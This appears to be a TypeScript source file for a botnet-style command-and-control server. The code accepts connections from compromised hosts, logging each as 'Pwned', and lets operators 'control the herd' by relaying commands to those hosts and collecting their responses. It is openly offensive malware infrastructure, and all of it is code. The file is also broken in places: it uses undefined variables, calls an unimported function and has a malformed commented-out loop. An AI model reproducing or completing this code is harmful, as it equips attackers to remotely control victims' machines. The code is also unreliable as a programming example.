import hosts = require('./hosts');
import controllers = require('./controllers');

interface CombinedServerOpts {
    host: string | undefined;
    port: number | undefined;
    controlHost: string | undefined;
    controlPort: number | undefined;
}

export class CombinedServer {
    hostList: Map<number, hosts.Host>;
    controllerList: Map<number, controllers.Controller>;
    nextHostID: number;
    nextControllerID: number;
    hostServer: hosts.HostServer;
    controlServer: controllers.ControlServer;

    constructor(opts: CombinedServerOpts) {
        const defaultOpts: CombinedServerOpts = {
            host: '0.0.0.0',
            port: 6996,
            controlHost: '127.0.0.1',
            controlPort: 35768
        };
        
        // for (let optName in defaultOpts) {
        //     for (optName in opts)) {
        //         opts[optName]
        //     }
        // }

        this.hostList = new Map();
        this.controllerList = new Map();
        this.nextHostID = 0;
        this.nextControllerID = 0;

        this.hostServer = hosts.createServer(hostIP, port, () => {
            console.log(`Listening for incoming connections at ${hostIP}:${port}`);
        });
        this.hostServer.on('connection', this.handleHostConnection.bind(this));
        this.controlServer = controllers.createServer(controlHostIP, controlPort, () => {
            console.log(`[>] Connect to control server at ${controlHostIP}:${controlPort}`);
        });
        this.controlServer.on('connection', this.handleControllerConnection.bind(this));
    }

    handleHostConnection(host: hosts.Host) {
        console.log(`[+] Pwned ${host.ip} ;)`);
        let hostID = this.nextHostID++;
        this.hostList.set(hostID, host);
        host.on('packet', (packet) => {
            let wrappedPkt = createPacket('control', 'response', 'hostresponse');
            wrappedPkt.id = hostID;
            wrappedPkt.data = packet;
            for (let c of this.controllerList.values()) {
                c.sendPacket(wrappedPkt);
            }
        });

        host.on('close', () => {
            console.log(`[-] Host ${host.ip} disconnected`);
            this.hostList.delete(hostID);
        });
        host.on('error', () => {
            console.log(`[!] Host ${host.ip} forcibly exited`);
        });

        let packet = createPacket('control', 'response', 'newpwn');
        packet.id = hostID;
        packet.ip = host.ip;
        for (let c of this.controllerList.values()) {
            c.sendPacket(packet);
        }
    }

    handleControllerConnection(controller: controllers.Controller) {
        console.log(`[+] Now controlling the herd from ${controller.ip}`);
        let controllerID = this.nextControllerID++;
        this.controllerList.set(controllerID, controller);
        for (let [id, host] of this.hostList) {
            let packet = createPacket('control', 'response', 'newpwn');
            packet.id = id;
            packet.ip = host.ip;
            controller.sendPacket(packet);
        }

        controller.on('hostcommand', (hostid, commandPacket) => {
            let hostOrUndefined = this.hostList.get(hostid);
            if (hostOrUndefined === undefined) {
                throw new Error('invalid host ID');
            }
            let host = hostOrUndefined;
            host.sendPacket(commandPacket);
        });

        controller.on('close', () => {
            console.log(`[-] Controller ${controller.ip} disconnected`);
            this.controllerList.delete(controllerID);
        });
        controller.on('error', () => {
            console.log(`[!] Controller ${controller.ip} forcibly exited`);
        });
    }
}
